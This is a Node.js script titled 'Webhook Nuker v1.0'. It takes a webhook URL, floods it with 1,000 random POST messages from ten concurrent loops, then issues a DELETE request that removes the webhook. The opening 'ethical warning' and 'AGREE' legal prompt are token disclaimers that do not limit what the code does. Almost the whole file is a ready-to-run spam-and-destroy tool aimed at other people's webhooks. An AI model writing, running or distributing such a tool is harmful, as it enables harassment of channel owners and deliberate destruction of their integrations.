const { execSync } = require('child_process');
const axios = require('axios');
const readlineSync = require('readline-sync');

try {
  require.resolve('axios');
  require.resolve('readline-sync');
} catch (e) {
  console.log('⚠️ Dependencies missing. Installing...');
  execSync('npm install axios readline-sync', { stdio: 'inherit' });
}

const MAX_REQUESTS = 1000;
const THREAD_COUNT = 10;
const DELAY_MS = 50;

const ethicalWarning = () => {
  console.clear();
  console.log('⚠️ ETHICAL WARNING ⚠️');
  console.log('🚨 This tool is for **ethical testing** only.');
  console.log('🚨 Ensure you have **explicit permission** to test the webhook.');
  console.log('🚨 **Unauthorized use** can result in serious legal consequences.');
  readlineSync.keyInPause('Press any key to continue...');
};

const signatureAgreement = () => {
  console.clear();
  console.log('⚖️ LEGAL AGREEMENT ⚖️');
  console.log('📜 By typing "AGREE" below, you acknowledge that:');
  console.log('🚨 You have **explicit permission** to test this webhook.');
  console.log('🚨 You will **NOT** use this script for any unauthorized activity.');
  console.log('🚨 **Any abuse** of this tool may result in **legal action**.');
  const agreement = readlineSync.question('Type "AGREE" to continue: ').toUpperCase();
  if (agreement !== 'AGREE') {
    console.log('❌ You must type "AGREE" to proceed.');
    process.exit(1);
  }
  console.log('✅ You have legally agreed to use this tool responsibly.');
};

const webhookUrl = readlineSync.question('Enter the Webhook URL: ');

const generateRandomPayload = () => ({
  username: Math.random().toString(36).substring(2, 10),
  content: Math.random().toString(36).substring(2, 50)
});

const sendRequest = async (threadId) => {
  try {
    for (let i = 0; i < MAX_REQUESTS / THREAD_COUNT; i++) {
      const payload = generateRandomPayload();
      const response = await axios.post(webhookUrl, payload);
      console.log(`🚀 Thread ${threadId}: Sent request! Status: ${response.status}`);
      await new Promise(resolve => setTimeout(resolve, DELAY_MS));
    }
  } catch (error) {
    console.error(`🔥 Thread ${threadId}: Error - ${error.message}`);
  }
};

const deleteWebhook = async () => {
  try {
    await axios.delete(webhookUrl);
    console.log('✅ Webhook deleted successfully.');
  } catch (error) {
    console.error('⚠️ Error deleting webhook:', error.message);
  }
};

const startNuking = async () => {
  console.clear();
  console.log('⚡️ Webhook Nuker v1.0 ⚡️');
  console.log('🔥 Nuking started... 🔥');

  const threads = [];

  for (let i = 1; i <= THREAD_COUNT; i++) {
    threads.push(sendRequest(i));
  }

  await Promise.all(threads);

  console.log('🔥 Nuking Complete');
  await deleteWebhook();
};

ethicalWarning();
signatureAgreement();
startNuking();
